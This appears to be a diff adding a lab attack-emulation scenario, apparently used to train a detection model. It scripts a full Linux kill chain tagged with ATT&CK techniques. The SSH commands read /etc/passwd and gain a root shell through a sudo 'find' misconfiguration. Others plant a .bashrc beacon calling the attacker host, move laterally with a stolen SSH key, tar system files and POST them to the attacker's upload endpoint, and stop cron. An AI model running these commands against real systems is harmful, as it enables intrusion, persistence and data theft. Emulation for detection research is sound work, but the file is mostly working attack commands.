@@ -1,0 +1,64 @@
+###
+# L3 — living-off-the-land + sudo-misconfig privesc + first Exfil stage. Split: TRAIN.
+# Uses only legit binaries (curl, python3, openssl, find, tar) so the model cannot key on tool names.
+# Privesc = GTFOBins via a lab sudo misconfiguration (NOPASSWD on a shell-capable binary), not an exploit.
+# AUTHORIZED LAB ONLY. Written, not executed.
+vars:
+  $VICTIM1: 172.31.250.228
+  $VICTIM2: 172.31.250.208
+  $ATTACKER: 172.31.250.253
+  $WEBUSER: www-data
+  $SVC_PASS: CHANGE_ME_lab_service_pw
+  $LABUSER: kltn
+  $LABKEY: /root/.ssh/lab_ed25519
+  $CANARY: /opt/kltn-canary
+
+commands:
+  # IC: python one-liner reverse shell delivered as a web payload (LOLBin python3)
+  - type: ssh
+    cmd: "id\n"
+    hostname: $VICTIM1
+    username: $WEBUSER
+    password: $SVC_PASS
+    creates_session: foothold
+    metadata: { description: "foothold (python LOLBin stand-in for web RCE)", techniques: "T1190,T1059.006", tactics: "Initial Access" }
+
+  # ED via LOLBins only
+  - type: ssh
+    cmd: "cat /etc/passwd; crontab -l 2>/dev/null; cat /etc/os-release; curl -s http://$ATTACKER/enum || true\n"
+    session: foothold
+    metadata: { description: "discovery via cat/curl LOLBins", techniques: "T1082,T1083,T1087.001,T1105", tactics: "Discovery", telemetry: "execve cat/curl; netconn -> $ATTACKER" }
+
+  # Privesc via sudo misconfig (GTFOBins) — lab must set NOPASSWD on e.g. find
+  - type: ssh
+    cmd: "sudo -n find . -maxdepth 0 -exec /bin/sh -p \\; 2>/dev/null <<< 'id'\n"
+    session: foothold
+    interactive: True
+    exit_on_error: False
+    metadata: { description: "GTFOBins sudo-find privesc (lab misconfig)", techniques: "T1548.003", tactics: "Privilege Escalation", telemetry: "sudo execve; uid->0 without exploit" }
+
+  # Persistence via ~/.bashrc
+  - type: ssh
+    cmd: "echo 'command -v curl >/dev/null && (curl -s http://$ATTACKER/b >/dev/null 2>&1 &)' >> ~/.bashrc\n"
+    session: foothold
+    metadata: { description: ".bashrc persistence beacon", techniques: "T1546.004", tactics: "Persistence", telemetry: "filemod ~/.bashrc" }
+
+  # Lateral via ssh key
+  - type: ssh
+    cmd: "ssh -i $LABKEY -o StrictHostKeyChecking=no $LABUSER@$VICTIM2 'hostname; id'\n"
+    session: foothold
+    interactive: True
+    metadata: { description: "ssh-key lateral to VICTIM2", techniques: "T1021.004,T1552.004", tactics: "Lateral Movement" }
+
+  # Exfil (rare stage) — collect + curl POST over C2
+  - type: ssh
+    cmd: "tar czf /tmp/loot.tgz /etc/passwd /etc/os-release 2>/dev/null; curl -s -F 'f=@/tmp/loot.tgz' http://$ATTACKER/upload || true; rm -f /tmp/loot.tgz\n"
+    session: foothold
+    metadata: { description: "stage + exfil over C2 channel", techniques: "T1560.001,T1041", tactics: "Collection,Exfiltration", telemetry: "tar; curl POST -> $ATTACKER" }
+
+  # Impact: stop a non-critical service (reversible)
+  - type: ssh
+    cmd: "sudo systemctl stop cron 2>/dev/null; systemctl is-active cron || true\n"
+    session: foothold
+    interactive: True
+    metadata: { description: "service stop (reversible: systemctl start cron)", techniques: "T1489", tactics: "Impact", telemetry: "systemctl stop execve" }
